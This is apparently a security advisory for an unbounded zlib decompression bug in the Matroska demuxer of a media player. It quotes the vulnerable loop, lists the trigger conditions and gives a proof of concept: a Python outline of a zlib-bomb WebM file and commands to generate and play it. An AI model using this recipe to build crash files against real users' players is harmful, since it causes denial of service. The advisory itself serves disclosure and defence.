DOS-003: `block_zlib_decompress` at `mkv/util.cpp:129`
- Per-frame zlib decompression with `block_Realloc(p_block, 0, n * 1000)`
- Requires `ContentEncodingScope=1` (all frames, not just CodecPrivate)
- Triggered during playback, not file open
- Uses WebM container with a SimpleBlock containing zlib-compressed data
```markdown
# DOS-003: Unbounded zlib Decompression in Per-Frame Block Data (OOM)

## Type

Denial of Service — Unbounded Memory Allocation

## Severity

Medium (CVSS 5.5: AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H)

## Location

```
File:   modules/demux/mkv/util.cpp
Func:   block_zlib_decompress
Lines:  126-143
```

## Description

The `block_Realloc` loop in `block_zlib_decompress` has **no upper bound** on decompressed output size per frame:

```c
n = 0;
p_block = block_Alloc(0);
do {
    n++;
    p_block = block_Realloc(p_block, 0, n * 1000);  // unlimited growth
    dst = static_cast<unsigned char *>(p_block->p_buffer);
    d_stream.next_out = (Bytef *)&dst[(n - 1) * 1000];
    d_stream.avail_out = 1000;
    result = inflate(&d_stream, Z_NO_FLUSH);
} while (d_stream.avail_out == 0 && d_stream.avail_in != 0 &&
         result != Z_STREAM_END);
```

An attacker embeds a zlib bomb inside a compressed SimpleBlock with `ContentEncodingScope=1` (all frames), causing `block_Realloc` to grow without limit for each frame played.

## Trigger conditions (checked at `mkv.cpp:620`)

```c
if (p_track->i_compression_type == MATROSKA_COMPRESSION_ZLIB &&
    (p_track->i_encoding_scope & MATROSKA_ENCODING_SCOPE_ALL_FRAMES))
    p_block = block_zlib_decompress(VLC_OBJECT(p_demux), p_block);
```

| MKV Element          | Value             | Meaning                   |
| -------------------- | ----------------- | ------------------------- |
| ContentEncodingScope | 1                 | All frames                |
| ContentCompAlgo      | 0                 | zlib                      |
| Track CodecID        | V_VP8             | Video codec (WebM)        |
| SimpleBlock data     | zlib bomb payload | per-frame compressed data |

## POC

**Generate malicious WebM (16KB file → 16MB per-frame allocation):**

```bash
python gen_all_mkv_tests.py dos003
vlc dos003_test.mkv   # watch memory in Task Manager
```

**POC script logic:**

```python
# Build: 16MB of zeros, compress to zlib bomb
raw = b'\x00' * (16 * 1024 * 1024)
codec_private = zlib.compress(raw, level=9)  # ~16KB

# Embed in WebM SimpleBlock with ContentEncodingScope=1, ContentCompAlgo=0
# Track: V_VP8, ContentEncodings(Scope=1, Algo=0)
# SimpleBlock: TrackNumber=1, timecode=0, lacing=0, data=compressed
```

## Impact

- ~16KB malicious `.webm` file
- Each frame during playback triggers one zlib bomb → OOM
- Sustained playback of multiple frames exhausts memory rapidly
